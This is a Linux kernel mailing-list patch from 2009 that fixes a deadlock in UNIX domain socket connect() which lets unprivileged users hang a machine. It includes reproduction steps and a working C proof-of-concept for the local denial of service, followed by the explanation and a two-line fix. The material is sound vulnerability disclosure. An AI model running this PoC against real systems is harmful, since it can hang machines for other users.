From: Tomoki Sekiyama <tomoki.sekiyama.qu@hitachi.com>
Subject: [PATCH] AF_UNIX: Fix deadlock on connecting to shutdown socket
Date: Mon, 19 Oct 2009 15:02:52 +0900
Message-ID: <4ADC010C.5070809@hitachi.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit
Cc: davem@davemloft.net, satoshi.oshima.fk@hitachi.com,
	hidehiro.kawai.ez@hitachi.com, hideo.aoki.tk@hitachi.com
To: linux-kernel@vger.kernel.org, netdev@vger.kernel.org,
	alan@lxorguk.ukuu.org.uk
Return-path: <netdev-owner@vger.kernel.org>
Received: from mailx.hitachi.co.jp ([133.145.228.49]:58590 "EHLO
	mailx.hitachi.co.jp" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1753471AbZJSGXU (ORCPT
	<rfc822;netdev@vger.kernel.org>); Mon, 19 Oct 2009 02:23:20 -0400
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

Hi,
I found a deadlock bug in UNIX domain socket, which makes able to DoS
attack against the local machine by non-root users.

How to reproduce:
1. Make a listening AF_UNIX/SOCK_STREAM socket with an abstruct
    namespace(*), and shutdown(2) it.
 2. Repeat connect(2)ing to the listening socket from the other sockets
    until the connection backlog is full-filled.
 3. connect(2) takes the CPU forever. If every core is taken, the
    system hangs.

PoC code: (Run as many times as cores on SMP machines.)

int main(void)
{
	int ret;
	int csd;
	int lsd;
	struct sockaddr_un sun;

	/* make an abstruct name address (*) */
	memset(&sun, 0, sizeof(sun));
	sun.sun_family = PF_UNIX;
	sprintf(&sun.sun_path[1], "%d", getpid());

	/* create the listening socket and shutdown */
	lsd = socket(AF_UNIX, SOCK_STREAM, 0);
	bind(lsd, (struct sockaddr *)&sun, sizeof(sun));
	listen(lsd, 1);
	shutdown(lsd, SHUT_RDWR);

	/* connect loop */
	alarm(15); /* forcely exit the loop after 15 sec */
	for (;;) {
		csd = socket(AF_UNIX, SOCK_STREAM, 0);
		ret = connect(csd, (struct sockaddr *)&sun, sizeof(sun));
		if (-1 == ret) {
			perror("connect()");
			break;
		}
		puts("Connection OK");
	}
	return 0;
}

(*) Make sun_path[0] = 0 to use the abstruct namespace.
    If a file-based socket is used, the system doesn't deadlock because
    of context switches in the file system layer.

Why this happens:
 Error checks between unix_socket_connect() and unix_wait_for_peer() are
 inconsistent. The former calls the latter to wait until the backlog is
 processed. Despite the latter returns without doing anything when the
 socket is shutdown, the former doesn't check the shutdown state and
 just retries calling the latter forever.

Patch:
 The patch below adds shutdown check into unix_socket_connect(), so
 connect(2) to the shutdown socket will return -ECONREFUSED.

Signed-off-by: Tomoki Sekiyama <tomoki.sekiyama.qu@hitachi.com>
Signed-off-by: Masanori Yoshida <masanori.yoshida.tv@hitachi.com>
---
 net/unix/af_unix.c |    2 ++
 1 files changed, 2 insertions(+), 0 deletions(-)

diff --git a/net/unix/af_unix.c b/net/unix/af_unix.c
index 51ab497..fc820cd 100644
--- a/net/unix/af_unix.c
+++ b/net/unix/af_unix.c
@@ -1074,6 +1074,8 @@ restart:
 	err = -ECONNREFUSED;
 	if (other->sk_state != TCP_LISTEN)
 		goto out_unlock;
+	if (other->sk_shutdown & RCV_SHUTDOWN)
+		goto out_unlock;

 	if (unix_recvq_full(other)) {
 		err = -EAGAIN;
-- 
Tomoki Sekiyama
Linux Technology Center
Hitachi, Ltd., Systems Development Laboratory
E-mail: tomoki.sekiyama.qu@hitachi.com

